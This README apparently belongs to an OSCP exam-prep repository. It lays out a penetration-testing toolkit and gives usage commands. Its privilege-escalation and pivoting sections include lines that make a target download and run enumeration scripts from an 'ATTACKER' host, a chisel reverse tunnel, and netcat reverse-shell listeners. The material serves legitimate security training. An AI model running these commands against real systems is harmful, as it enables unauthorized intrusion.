# OSCP Exam Toolkit

A comprehensive collection of scripts, cheatsheets, and resources for the OSCP exam.

## Directory Structure

```
OSCP-Toolkit/
│
├── 00-Cheatsheets/          # Quick reference guides
│   ├── reverse_shells.md    # All reverse shell one-liners
│   ├── enumeration.md       # Service enumeration commands
│   ├── privesc_linux.md     # Linux privilege escalation
│   ├── privesc_windows.md   # Windows privilege escalation
│   ├── buffer_overflow.md   # BOF methodology
│   ├── transfer_files.md    # File transfer methods
│   └── pivoting.md          # Pivoting techniques
│
├── 01-Scripts/              # Custom automation scripts
│   ├── python/
│   │   ├── simple_http_server.py   # HTTP server with upload
│   │   ├── port_scanner.py         # Multi-threaded scanner
│   │   ├── brute_stub.py           # Brute force template
│   │   └── exploit_template.py     # Exploit skeleton
│   └── bash/
│       ├── auto_enum.sh            # Automated enumeration
│       ├── fast_port_scan.sh       # Pure bash scanner
│       └── dir_enum.sh             # Directory enumeration
│
├── 02-Enumeration/          # Enumeration tools (download)
│   ├── linux/               # LinPEAS, LinEnum, pspy, etc.
│   └── windows/             # WinPEAS, Seatbelt, Watson, etc.
│
├── 03-Wordlists/            # Wordlists for fuzzing/cracking
│   ├── rockyou.txt          # Download separately
│   ├── directory-wordlists/
│   ├── username-lists/
│   └── password-lists/
│
├── 04-Web/                  # Web attack payloads
│   ├── common_web_payloads.txt
│   ├── sqli_payloads.txt
│   ├── xss_payloads.txt
│   ├── lfi_rfi_payloads.txt
│   └── fuzz_params.txt
│
├── 05-Privesc/              # Privilege escalation checklists
│   ├── linux/
│   │   ├── suid_checklist.md
│   │   ├── capabilities_checklist.md
│   │   └── cron_checklist.md
│   └── windows/
│       ├── unquoted_services_checklist.md
│       ├── registry_privesc.md
│       └── scheduled_tasks.md
│
├── 06-Exploits/             # Exploit collection
│   ├── exploitdb_mirror/    # Clone ExploitDB
│   ├── kernel_exploits/
│   ├── smb/
│   ├── ftp/
│   ├── web/
│   └── windows_lpe/
│
├── 07-ReverseShells/        # Shell payloads by language
│   ├── bash.txt
│   ├── python.txt
│   ├── perl.txt
│   ├── php.txt
│   ├── powershell.txt
│   ├── nc.txt
│   └── msfvenom.txt
│
└── 08-Pivoting/             # Tunneling guides
    ├── chisel/
    ├── ssh_tunnels.md
    └── socat.md
```

---

## Quick Start

### 1. Download Required Tools

```bash
cd OSCP-Toolkit

# LinPEAS
wget -O 02-Enumeration/linux/linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# WinPEAS
wget -O 02-Enumeration/windows/winPEASx64.exe https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe

# Chisel
wget -O 08-Pivoting/chisel/chisel https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz && gunzip 08-Pivoting/chisel/chisel.gz

# Pspy
wget -O 02-Enumeration/linux/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

### 2. Make Scripts Executable

```bash
chmod +x 01-Scripts/bash/*.sh
chmod +x 01-Scripts/python/*.py
chmod +x 02-Enumeration/linux/*
```

### 3. Verify Setup

```bash
ls -la */
```

---

## Usage During Exam

### Initial Enumeration

```bash
# Quick port scan
./01-Scripts/bash/fast_port_scan.sh TARGET

# Full enumeration
./01-Scripts/bash/auto_enum.sh TARGET
```

### Reverse Shells

```bash
# Check 07-ReverseShells/ for payloads
# Or use msfvenom.txt for generation commands
```

### Privilege Escalation

```bash
# Linux - transfer and run LinPEAS
python3 -m http.server 80
# On target: wget http://ATTACKER/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# Windows - transfer and run WinPEAS
# On target: certutil -urlcache -split -f http://ATTACKER/winPEASx64.exe winPEASx64.exe
```

### Web Attacks

```bash
# Directory enumeration
./01-Scripts/bash/dir_enum.sh http://TARGET

# Check 04-Web/ for payloads
```

### Pivoting

```bash
# Start chisel server
./08-Pivoting/chisel/chisel server -p 8080 --reverse

# On pivot host
./chisel client ATTACKER:8080 R:socks

# Use proxychains
proxychains nmap -sT -Pn INTERNAL_TARGET
```

---

## Important Notes

### Before the Exam

1. **Download all tools** - Network access may be limited
2. **Compile exploits** - Have pre-compiled versions ready
3. **Test all scripts** - Ensure everything works
4. **Organize notes** - Know where everything is

### During the Exam

1. **Enumerate thoroughly** - Don't miss services
2. **Document everything** - Take notes and screenshots
3. **Try simple things first** - Default credentials, known CVEs
4. **Check multiple privesc vectors** - Don't tunnel vision

### Time Management

- Initial enumeration: 30 min per host
- Exploitation attempts: 1-2 hours per host
- Privilege escalation: 30-60 min per host
- Documentation: Ongoing

---

## Key Resources

### Reference Sites

- [GTFOBins](https://gtfobins.github.io/) - Linux privilege escalation
- [LOLBAS](https://lolbas-project.github.io/) - Windows living off the land
- [HackTricks](https://book.hacktricks.xyz/) - Comprehensive pentesting guide
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Payload lists
- [ExploitDB](https://www.exploit-db.com/) - Exploit database

### Quick Commands

```bash
# Start HTTP server
python3 -m http.server 80

# Start listener
nc -lvnp 4444
rlwrap nc -lvnp 4444  # With readline

# Generate password hash
openssl passwd -1 password

# Port scan
nmap -sC -sV -oA scan TARGET
```

---

## License

This toolkit is for educational purposes and authorized security testing only.

Good luck on your OSCP exam! 🎯



